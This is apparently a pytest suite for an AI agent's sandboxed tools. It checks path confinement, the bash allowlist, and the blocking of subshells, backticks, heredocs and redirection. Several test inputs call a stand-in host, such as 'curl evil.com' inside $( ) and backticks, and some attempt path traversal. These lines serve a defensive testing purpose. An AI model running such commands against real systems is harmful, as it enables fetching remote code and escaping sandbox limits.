import sys
import os
import time
import shutil
from pathlib import Path

from src.agent import bash_executor
from src.agent.tools import ToolExecutor, execute_tool
from src.agent.tool_schema import TOOL_DEFINITIONS, TOOL_REGISTRY, ToolDef, register_tool
from src.agent.bash_policy import ALLOWED_BASH_COMMANDS

import pytest


@pytest.fixture
def project_dir(tmp_path):
    d = tmp_path / "project"
    d.mkdir()
    return d


@pytest.fixture
def harness_dir(tmp_path):
    d = tmp_path / "harness"
    d.mkdir()
    return d


# --- Read tests ---

def test_read_file(project_dir, harness_dir):
    f = project_dir / "hello.txt"
    f.write_text("line1\nline2\nline3\n")
    result = execute_tool("Read", {"file_path": str(f)}, project_dir, harness_dir)
    assert "1" in result
    assert "line1" in result
    assert "line2" in result
    assert "line3" in result


def test_read_with_offset_limit(project_dir, harness_dir):
    f = project_dir / "data.txt"
    content = "\n".join(f"line{i}" for i in range(1, 11)) + "\n"
    f.write_text(content)
    result = execute_tool("Read", {"file_path": str(f), "offset": 3, "limit": 2}, project_dir, harness_dir)
    assert "line3" in result
    assert "line4" in result
    assert "line2" not in result
    assert "line5" not in result


def test_read_nonexistent(project_dir, harness_dir):
    result = execute_tool("Read", {"file_path": str(project_dir / "nope.txt")}, project_dir, harness_dir)
    assert result.startswith("Error:")


def test_read_inside_harness(project_dir, harness_dir):
    f = harness_dir / "context.md"
    f.write_text("harness notes\n", encoding="utf-8")
    result = execute_tool("Read", {"file_path": str(f)}, project_dir, harness_dir)
    assert "harness notes" in result


def test_read_outside_rejected(project_dir, harness_dir, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("secret", encoding="utf-8")
    result = execute_tool("Read", {"file_path": str(outside)}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


def test_read_path_traversal_rejected(project_dir, harness_dir, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("secret", encoding="utf-8")
    result = execute_tool("Read", {"file_path": "../outside.txt"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


# --- Write tests ---

def test_write_inside_project(project_dir, harness_dir):
    target = project_dir / "out.txt"
    result = execute_tool("Write", {"file_path": str(target), "content": "hello"}, project_dir, harness_dir)
    assert "Successfully" in result
    assert target.read_text() == "hello"


def test_write_inside_harness(project_dir, harness_dir):
    target = harness_dir / "out.txt"
    result = execute_tool("Write", {"file_path": str(target), "content": "data"}, project_dir, harness_dir)
    assert "Successfully" in result
    assert target.read_text() == "data"


def test_write_outside_rejected(project_dir, harness_dir, tmp_path):
    target = tmp_path / "outside.txt"
    result = execute_tool("Write", {"file_path": str(target), "content": "bad"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert not target.exists()


def test_write_creates_parents(project_dir, harness_dir):
    target = project_dir / "sub" / "deep" / "file.txt"
    result = execute_tool("Write", {"file_path": str(target), "content": "nested"}, project_dir, harness_dir)
    assert "Successfully" in result
    assert target.read_text() == "nested"


def test_write_path_traversal(project_dir, harness_dir):
    evil = str(project_dir / ".." / ".." / "evil.txt")
    result = execute_tool("Write", {"file_path": evil, "content": "pwned"}, project_dir, harness_dir)
    assert result.startswith("Error:")


# --- Edit tests ---

def test_edit_single_replace(project_dir, harness_dir):
    f = project_dir / "code.py"
    f.write_text("def foo():\n    pass\n")
    result = execute_tool("Edit", {
        "file_path": str(f), "old_string": "foo", "new_string": "bar"
    }, project_dir, harness_dir)
    assert "Replaced 1" in result
    assert "bar" in f.read_text()


def test_edit_replace_all(project_dir, harness_dir):
    f = project_dir / "multi.txt"
    f.write_text("aaa bbb aaa ccc aaa\n")
    result = execute_tool("Edit", {
        "file_path": str(f), "old_string": "aaa", "new_string": "xxx", "replace_all": True
    }, project_dir, harness_dir)
    assert "Replaced 3" in result
    assert f.read_text() == "xxx bbb xxx ccc xxx\n"


def test_edit_ambiguous_rejected(project_dir, harness_dir):
    f = project_dir / "dup.txt"
    f.write_text("hello hello hello\n")
    result = execute_tool("Edit", {
        "file_path": str(f), "old_string": "hello", "new_string": "bye"
    }, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "3 times" in result
    assert f.read_text() == "hello hello hello\n"


def test_edit_not_found(project_dir, harness_dir):
    f = project_dir / "nope.txt"
    f.write_text("some content\n")
    result = execute_tool("Edit", {
        "file_path": str(f), "old_string": "missing", "new_string": "x"
    }, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not found" in result


def test_edit_path_security(project_dir, harness_dir, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("secret")
    result = execute_tool("Edit", {
        "file_path": str(outside), "old_string": "secret", "new_string": "hacked"
    }, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert outside.read_text() == "secret"


# --- Bash tests ---

def test_bash_allowed(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo hello"}, project_dir, harness_dir)
    assert "hello" in result


def test_bash_rejected(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "curl http://evil.com"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not in the allowed list" in result


def test_bash_pipe_first_token(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo test | head"}, project_dir, harness_dir)
    assert not result.startswith("Error:")


def test_bash_runs_without_shell(project_dir, harness_dir, monkeypatch):
    calls = []

    class Completed:
        stdout = "ok\n"
        stderr = ""
        returncode = 0

    def fake_run(args, **kwargs):
        calls.append((args, kwargs))
        return Completed()

    monkeypatch.setattr(bash_executor.subprocess, "run", fake_run)
    result = execute_tool("Bash", {"command": "git status"}, project_dir, harness_dir)
    assert result == "ok\n"
    assert calls[0][0] == ["git", "status"]
    assert calls[0][1].get("shell") is not True


def test_bash_redirection_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo secret > outside.txt"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_outside_absolute_path_rejected(project_dir, harness_dir, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("secret", encoding="utf-8")
    result = execute_tool("Bash", {"command": f"cat {outside}"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


def test_bash_path_traversal_rejected(project_dir, harness_dir, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("secret", encoding="utf-8")
    result = execute_tool("Bash", {"command": "cat ../outside.txt"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


def test_bash_subshell_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo $(curl evil.com)"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_backtick_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo `curl evil.com`"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_process_substitution_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "diff <(cat a.txt) b.txt"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_heredoc_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "cat <<EOF\ncurl evil.com\nEOF"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_nested_subshell_blocked(project_dir, harness_dir):
    result = execute_tool("Bash", {"command": "echo $(echo $(whoami))"}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_bash_timeout(project_dir, harness_dir):
    cmd = "python3 -c \"import time; time.sleep(10)\""
    result = execute_tool("Bash", {"command": cmd, "timeout": 1}, project_dir, harness_dir)
    assert "timed out" in result or "Error" in result


# --- Glob tests ---

def test_glob_matches(project_dir, harness_dir):
    (project_dir / "a.py").write_text("pass")
    (project_dir / "b.py").write_text("pass")
    (project_dir / "c.txt").write_text("text")
    result = execute_tool("Glob", {"pattern": "*.py"}, project_dir, harness_dir)
    assert "a.py" in result
    assert "b.py" in result
    assert "c.txt" not in result


def test_glob_empty(project_dir, harness_dir):
    result = execute_tool("Glob", {"pattern": "*.xyz"}, project_dir, harness_dir)
    assert result == ""


def test_glob_mtime_order(project_dir, harness_dir):
    f1 = project_dir / "old.py"
    f1.write_text("old")
    import time
    time.sleep(0.1)
    f2 = project_dir / "new.py"
    f2.write_text("new")
    result = execute_tool("Glob", {"pattern": "*.py"}, project_dir, harness_dir)
    result_lines = result.strip().splitlines()
    assert len(result_lines) == 2
    assert "new.py" in result_lines[0]
    assert "old.py" in result_lines[1]


# --- Grep tests ---

def test_grep_with_rg(project_dir, harness_dir):
    if not shutil.which("rg"):
        pytest.skip("ripgrep not available")
    (project_dir / "sample.py").write_text("def foo():\n    pass\n")
    result = execute_tool("Grep", {"pattern": "def foo", "path": str(project_dir)}, project_dir, harness_dir)
    assert "sample.py" in result


def test_grep_fallback(project_dir, harness_dir, monkeypatch):
    monkeypatch.setattr(shutil, "which", lambda x: None)
    (project_dir / "code.py").write_text("def bar():\n    return 42\n")
    result = execute_tool("Grep", {"pattern": "def bar", "path": str(project_dir)}, project_dir, harness_dir)
    assert "code.py" in result


def test_grep_files_with_matches(project_dir, harness_dir, monkeypatch):
    monkeypatch.setattr(shutil, "which", lambda x: None)
    (project_dir / "a.py").write_text("target_string\n")
    (project_dir / "b.py").write_text("other_content\n")
    result = execute_tool("Grep", {"pattern": "target_string", "path": str(project_dir)}, project_dir, harness_dir)
    assert "a.py" in result
    assert "b.py" not in result


def test_glob_outside_rejected(project_dir, harness_dir, tmp_path):
    result = execute_tool("Glob", {"pattern": "*.txt", "path": str(tmp_path)}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


def test_grep_outside_rejected(project_dir, harness_dir, tmp_path):
    result = execute_tool("Grep", {"pattern": "secret", "path": str(tmp_path)}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "outside allowed directories" in result


# --- Meta tests ---

def test_tool_definitions_valid():
    assert len(TOOL_DEFINITIONS) == 6
    for td in TOOL_DEFINITIONS:
        assert "name" in td
        assert "description" in td
        assert "input_schema" in td
        schema = td["input_schema"]
        assert schema["type"] == "object"
        assert "properties" in schema
        assert "required" in schema


def test_execute_tool_unknown(project_dir, harness_dir):
    result = execute_tool("FakeToolXYZ", {}, project_dir, harness_dir)
    assert result.startswith("Error:")
    assert "unknown tool" in result


class TestToolExecutor:
    def test_read(self, project_dir, harness_dir):
        (project_dir / "hello.txt").write_text("line1\nline2\n", encoding="utf-8")
        executor = ToolExecutor(project_dir, harness_dir)
        result = executor.execute("Read", {"file_path": str(project_dir / "hello.txt")})
        assert "line1" in result
        assert "line2" in result

    def test_write(self, project_dir, harness_dir):
        executor = ToolExecutor(project_dir, harness_dir)
        target = project_dir / "out.txt"
        result = executor.execute("Write", {"file_path": str(target), "content": "hi"})
        assert "Successfully" in result
        assert target.read_text(encoding="utf-8") == "hi"

    def test_edit(self, project_dir, harness_dir):
        f = project_dir / "file.txt"
        f.write_text("old value here", encoding="utf-8")
        executor = ToolExecutor(project_dir, harness_dir)
        result = executor.execute("Edit", {
            "file_path": str(f), "old_string": "old", "new_string": "new",
        })
        assert "Replaced" in result
        assert f.read_text(encoding="utf-8") == "new value here"

    def test_unknown_tool(self, project_dir, harness_dir):
        executor = ToolExecutor(project_dir, harness_dir)
        result = executor.execute("Nope", {})
        assert "unknown tool" in result

    def test_definitions_class_attr(self):
        assert ToolExecutor.DEFINITIONS is TOOL_DEFINITIONS

    def test_dispatch_uses_registry(self, project_dir, harness_dir):
        (project_dir / "reg.txt").write_text("hello", encoding="utf-8")
        executor = ToolExecutor(project_dir, harness_dir)
        for name in TOOL_REGISTRY:
            td = TOOL_REGISTRY[name]
            assert td.handler is not None

    def test_execute_tool_delegates_to_class(self, project_dir, harness_dir):
        (project_dir / "a.txt").write_text("content", encoding="utf-8")
        class_result = ToolExecutor(project_dir, harness_dir).execute(
            "Read", {"file_path": str(project_dir / "a.txt")})
        func_result = execute_tool(
            "Read", {"file_path": str(project_dir / "a.txt")}, project_dir, harness_dir)
        assert class_result == func_result


class TestToolRegistry:

    def test_registry_has_all_tools(self):
        assert set(TOOL_REGISTRY.keys()) == {"Read", "Write", "Edit", "Bash", "Glob", "Grep"}

    def test_registry_entries_are_tool_defs(self):
        for name, td in TOOL_REGISTRY.items():
            assert isinstance(td, ToolDef)
            assert td.schema["name"] == name
            assert callable(td.handler)

    def test_definitions_derived_from_registry(self):
        registry_schemas = [td.schema for td in TOOL_REGISTRY.values()]
        assert TOOL_DEFINITIONS == registry_schemas

    def test_register_tool_extends_registry(self):
        original_count = len(TOOL_REGISTRY)
        try:
            register_tool("TestTool", {"name": "TestTool", "description": "test", "input_schema": {}}, lambda i, p, h: "ok")
            assert "TestTool" in TOOL_REGISTRY
            assert any(d["name"] == "TestTool" for d in TOOL_DEFINITIONS)
        finally:
            TOOL_REGISTRY.pop("TestTool", None)
            TOOL_DEFINITIONS.clear()
            TOOL_DEFINITIONS.extend(td.schema for td in TOOL_REGISTRY.values())
            assert len(TOOL_REGISTRY) == original_count

    def test_schema_handler_colocation(self):
        from src.agent.file_tools import READ_SCHEMA, _tool_read
        td = TOOL_REGISTRY["Read"]
        assert td.schema is READ_SCHEMA
        assert td.handler is _tool_read

